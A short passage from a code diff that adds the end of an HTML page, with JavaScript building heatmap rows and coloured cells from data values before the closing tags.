+          return `<div class="heatmap-cell" style="background:rgba(${r},${g},${b},${a});" title="${v}"></div>`;
+        }).join('');
+        return `<div class="heatmap-row">${cells}</div>`;
+      }).join('');
+    });
+  </script>
+</body>
+</html>
